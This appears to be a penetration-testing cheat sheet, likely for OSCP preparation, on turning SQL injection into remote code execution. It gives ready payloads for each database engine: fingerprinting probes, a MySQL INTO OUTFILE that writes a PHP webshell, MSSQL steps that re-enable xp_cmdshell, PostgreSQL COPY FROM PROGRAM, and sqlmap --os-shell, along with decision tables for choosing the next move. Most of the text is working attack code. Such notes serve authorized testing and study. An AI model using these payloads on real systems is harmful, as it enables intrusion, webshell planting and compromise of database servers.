# SQLi → RCE

## 1. Confirm & identify DB engine

```
' OR 1=1-- -
' AND 1=CONVERT(int,@@version)-- -   # MSSQL error-based fingerprint
' AND extractvalue(1,concat(0x7e,version()))-- -   # MySQL
' AND 1=CAST(version() AS int)-- -   # PostgreSQL
```

**Decision point:** error message reveals engine → jump to matching section below. No errors → try UNION-based / boolean-blind to fingerprint via `version()`/`@@version`/`banner`.

---

## 2. MySQL → RCE

**Requires:** `FILE` priv + `secure_file_priv` empty/writable + web-writable path known.

```sql
' UNION SELECT 1,"<?php system($_GET['c']);?>",3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Decision point:**

|Condition|Next move|
|---|---|
|`secure_file_priv` empty|`INTO OUTFILE` works directly|
|`secure_file_priv` = NULL|file write disabled entirely — abandon this vector|
|No known web path|try common paths (`/var/www/html`, `/var/www/`, XAMPP `htdocs`) or LFI to confirm docroot first|
|No `FILE` priv|try UDF (`lib_mysqludf_sys`) if `plugin_dir` writable — advanced, noisy|

Trigger: `http://target/shell.php?c=id`

---

## 3. MSSQL → RCE

```sql
'; EXEC xp_cmdshell 'whoami'-- -
```

**Decision point:**

|Condition|Next move|
|---|---|
|`xp_cmdshell` runs|done — full command exec|
|Disabled, sysadmin rights|re-enable it:|

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami'-- -
```

| No sysadmin | try `sp_OACreate` (OLE Automation) or stacked-query file write to a UNC path for NTLM relay/coerce |

---

## 4. PostgreSQL → RCE

```sql
'; CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;-- -
```

**Decision point:** superuser required for `COPY ... FROM PROGRAM`. No superuser → try `lo_import`/large object write to a UDF path (rare, version-dependent), or fall back to file read only (`pg_read_file`) for creds, not RCE.

---

## 5. Oracle → RCE (rarer, note only)

Java stored proc (`DBMS_JAVA`) or `UTL_HTTP` for SSRF chain — requires elevated privs; low OSCP relevance, skip unless explicitly in scope.

---

## Fast-path priority (try in this order)

1. MySQL `INTO OUTFILE` with known web path (fastest if `FILE` priv confirmed)
2. MSSQL `xp_cmdshell` (near-instant if sysadmin)
3. PostgreSQL `COPY FROM PROGRAM` (if superuser)
4. Stacked-query file write → webshell (any engine supporting multi-statement)
5. sqlmap `--os-shell` / `--os-pwn` as a shortcut once injection point + engine confirmed:

```
sqlmap -u "<url>" --data="<body>" -p <param> --os-shell
```

**Doc reminder:** log which fingerprint step confirmed the engine and which privilege check justified the chosen RCE technique — required for the report.